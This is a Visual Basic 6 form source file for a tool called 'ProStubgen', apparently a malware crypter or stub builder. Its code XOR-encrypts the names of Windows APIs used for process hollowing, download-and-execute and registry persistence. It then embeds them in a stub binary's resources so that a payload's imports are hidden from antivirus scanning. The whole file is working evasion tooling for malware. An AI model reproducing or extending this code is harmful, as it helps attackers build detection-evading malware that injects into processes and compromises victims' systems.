VERSION 5.00
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "ProStubgen"
   ClientHeight    =   6855
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   9315
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6855
   ScaleWidth      =   9315
   StartUpPosition =   3  'Windows Default
   Begin VB.Frame Frame2 
      Caption         =   "Encryption"
      Height          =   1215
      Left            =   120
      TabIndex        =   6
      Top             =   4800
      Width           =   9135
      Begin VB.CommandButton cmdGenpw 
         Caption         =   "Generate"
         Height          =   255
         Left            =   8040
         TabIndex        =   9
         Top             =   360
         Width           =   975
      End
      Begin VB.TextBox txtPassword 
         Height          =   285
         Left            =   1800
         MaxLength       =   32
         TabIndex        =   8
         Text            =   "Password"
         Top             =   360
         Width           =   6135
      End
      Begin VB.Label Label3 
         Caption         =   "Encryption password:"
         Height          =   255
         Left            =   120
         TabIndex        =   7
         Top             =   360
         Width           =   1575
      End
   End
   Begin VB.Frame Frame1 
      Caption         =   "Import Table"
      Height          =   4575
      Left            =   120
      TabIndex        =   1
      Top             =   120
      Width           =   9135
      Begin VB.TextBox txtAPI 
         Height          =   3735
         Left            =   2040
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         TabIndex        =   4
         Top             =   600
         Width           =   6975
      End
      Begin VB.ListBox lstDlls 
         Height          =   3765
         ItemData        =   "frmMain.frx":000C
         Left            =   120
         List            =   "frmMain.frx":001F
         TabIndex        =   2
         Top             =   600
         Width           =   1815
      End
      Begin VB.Label Label2 
         Caption         =   "API Names / Encrypted API Names"
         Height          =   255
         Left            =   4080
         TabIndex        =   5
         Top             =   360
         Width           =   2655
      End
      Begin VB.Label Label1 
         Caption         =   "Dlls"
         Height          =   255
         Left            =   720
         TabIndex        =   3
         Top             =   360
         Width           =   375
      End
   End
   Begin VB.CommandButton cmdGenerate 
      Caption         =   "Create"
      Height          =   495
      Left            =   8040
      TabIndex        =   0
      Top             =   6240
      Width           =   1215
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function UpdateResource Lib "kernel32" Alias "UpdateResourceA" (ByVal hUpdate As Long, ByVal lpType As Long, ByVal lpName As Long, ByVal wLanguage As Long, lpData As Any, ByVal cbData As Long) As Long
Private Declare Function BeginUpdateResource Lib "kernel32" Alias "BeginUpdateResourceA" (ByVal pFileName As String, ByVal bDeleteExistingResources As Long) As Long
Private Declare Function EndUpdateResource Lib "kernel32" Alias "EndUpdateResourceA" (ByVal hUpdate As Long, ByVal fDiscard As Long) As Long

Private apiKernel32 As String
Private apiNtdll As String
Private apiWinInet As String
Private apiADVAPI32 As String
Private apiUrlMon As String
Private apiZwUnmapViewOfSection As String
Private apiCreateProcessA As String
Private apiGetThreadContext As String
Private apiReadProcessMemory As String
Private apiVirtualAllocEx As String
Private apiVirtualProtectEx As String
Private apiWriteProcessMemory As String
Private apiSetThreadContext As String
Private apiResumeThread As String
Private apiCloseHandle As String
Private apiCopyFileA As String
Private apiURLDownloadToFileA As String
Private apiDeleteUrlCacheEntryA As String
Private apiRegCloseKey As String
Private apiRegSetValueExA As String
Private apiPass As String

Private Sub UpdateRes(bmpFile As String, strTarget As String, resType As Long, resID As Long)
    Dim PicBMP() As Byte ' DIB buffer
    Dim rSize As Long
    rSize = FileLen(bmpFile)
    ReDim PicBMP(rSize - 1)
    ff = FreeFile
    Open bmpFile For Binary As ff
    Get ff, , PicBMP ' Here's the DIB bitmap
    Close ff
    
    Dim hUpt As Long, ret As Long
    hUpt = BeginUpdateResource(strTarget, 0) ' use 1 to clear all existing!
    ret = UpdateResource(hUpt, resType, resID, 1035, PicBMP(0), rSize)
    ret = EndUpdateResource(hUpt, 0) ' 0 = change
End Sub

Private Sub CleanEOF(strFile As String)
    Dim tmpStr As String
    Dim lngPos As Long
    tmpStr = File2Str(strFile)
    
    lngPos = InStr(1, tmpStr, "PADDINGX")
    
    ReDim bufNull(0 To FileLen(strFile) - lngPos) As Byte
    ff = FreeFile
    
    Open strFile For Binary Access Write As ff
    Seek ff, lngPos
    Put ff, , bufNull
    Close ff
End Sub

Private Function File2Str(file As String) As String
    Dim ff As Long
    ff = FreeFile
    
    Open file For Binary Access Read As ff
    File2Str = Input(FileLen(file), ff)
    Close ff
End Function

Private Sub cmdGenerate_Click()
    Dim bufStub() As Byte
    Dim ff As Long

    apiKernel32 = strXOR("Kernel32.dll", txtPassword, True)
    apiNtdll = strXOR("Ntdll.dll", txtPassword, True)
    apiWinInet = strXOR("WinInet.dll", txtPassword, True)
    apiADVAPI32 = strXOR("ADVAPI32.dll", txtPassword, True)
    apiUrlMon = strXOR("urlmon.dll", txtPassword, True)
    apiZwUnmapViewOfSection = strXOR("ZwUnmapViewOfSection", txtPassword, True)
    apiCreateProcessA = strXOR("CreateProcessA", txtPassword, True)
    apiGetThreadContext = strXOR("GetThreadContext", txtPassword, True)
    apiReadProcessMemory = strXOR("ReadProcessMemory", txtPassword, True)
    apiVirtualAllocEx = strXOR("VirtualAllocEx", txtPassword, True)
    apiVirtualProtectEx = strXOR("VirtualProtectEx", txtPassword, True)
    apiWriteProcessMemory = strXOR("WriteProcessMemory", txtPassword, True)
    apiSetThreadContext = strXOR("SetThreadContext", txtPassword, True)
    apiResumeThread = strXOR("ResumeThread", txtPassword, True)
    apiCloseHandle = strXOR("CloseHandle", txtPassword, True)
    apiCopyFileA = strXOR("CopyFileA", txtPassword, True)
    apiURLDownloadToFileA = strXOR("URLDownloadToFileA", txtPassword, True)
    apiDeleteUrlCacheEntryA = strXOR("DeleteUrlCacheEntryA", txtPassword, True)
    apiRegCloseKey = strXOR("RegCloseKey", txtPassword, True)
    apiRegSetValueExA = strXOR("RegSetValueExA", txtPassword, True)
    apiPass = txtPassword
    
    ff = FreeFile
    Open App.Path & "\settings.ini" For Output As #ff
        Print #ff, apiKernel32 & _
        "###" & apiNtdll & _
        "###" & apiWinInet & _
        "###" & apiADVAPI32 & _
        "###" & apiUrlMon & _
        "###" & apiZwUnmapViewOfSection & _
        "###" & apiCreateProcessA & _
        "###" & apiGetThreadContext & _
        "###" & apiReadProcessMemory & _
        "###" & apiVirtualAllocEx & _
        "###" & apiVirtualProtectEx & _
        "###" & apiWriteProcessMemory & _
        "###" & apiSetThreadContext & _
        "###" & apiResumeThread & _
        "###" & apiCloseHandle & _
        "###" & apiCopyFileA & _
        "###" & apiURLDownloadToFileA & _
        "###" & apiDeleteUrlCacheEntryA & _
        "###" & apiRegCloseKey & _
        "###" & apiRegSetValueExA & _
        "###" & apiPass & "###"
    Close #ff
        
    ff = FreeFile
    bufStub = LoadResData(101, "CUSTOM")
    Open App.Path & "\stub.bin" For Binary Access Write As ff
        Put ff, , bufStub
    Close ff
    Erase bufStub
    
    Call UpdateRes(App.Path & "\settings.ini", App.Path & "\stub.bin", 52, 33)
    Kill App.Path & "\settings.ini"
    Call CleanEOF(App.Path & "\stub.bin") 'Overwrite junkdata at EOF
    MsgBox "Stub successfully generated", vbInformation
End Sub

Private Sub cmdGenpw_Click()
    txtPassword = GenerateKey(32, 32)
    Call PrintApis
End Sub

Private Sub lstDlls_Click()
    Call PrintApis
End Sub

Private Sub PrintApis()
    Select Case lstDlls.ListIndex
    Case 0:
        txtAPI = "CreateProcessA" & " = " & strXOR("CreateProcessA", txtPassword, True) & vbNewLine & _
        "GetThreadContext" & " = " & strXOR("GetThreadContext", txtPassword, True) & vbNewLine & _
        "ReadProcessMemory" & " = " & strXOR("ReadProcessMemory", txtPassword, True) & vbNewLine & _
        "VirtualAllocEx" & " = " & strXOR("VirtualAllocEx", txtPassword, True) & vbNewLine & _
        "VirtualProtectEx" & " = " & strXOR("VirtualProtectEx", txtPassword, True) & vbNewLine & _
        "WriteProcessMemory" & " = " & strXOR("WriteProcessMemory", txtPassword, True) & vbNewLine & _
        "SetThreadContext" & " = " & strXOR("SetThreadContext", txtPassword, True) & vbNewLine & _
        "ResumeThread" & " = " & strXOR("ResumeThread", txtPassword, True) & vbNewLine & _
        "CloseHandle" & " = " & strXOR("CloseHandle", txtPassword, True) & vbNewLine & _
        "CopyFileA" & " = " & strXOR("CopyFileA", txtPassword, True)
    Case 1:
        txtAPI = "ZwUnmapViewOfSection" & " = " & strXOR("ZwUnmapViewOfSection", txtPassword, True)
    Case 2:
        txtAPI = "RegSetValueExA" & " = " & strXOR("RegSetValueExA", txtPassword, True) & vbNewLine & _
        "RegCloseKey" & " = " & strXOR("RegCloseKey", txtPassword, True)
    Case 3:
        txtAPI = "URLDownloadToFileA" & " = " & strXOR("URLDownloadToFileA", txtPassword, True)
    Case 4:
        txtAPI = "DeleteUrlCacheEntryA " & " = " & strXOR("DeleteUrlCacheEntryA ", txtPassword, True)
    End Select
End Sub
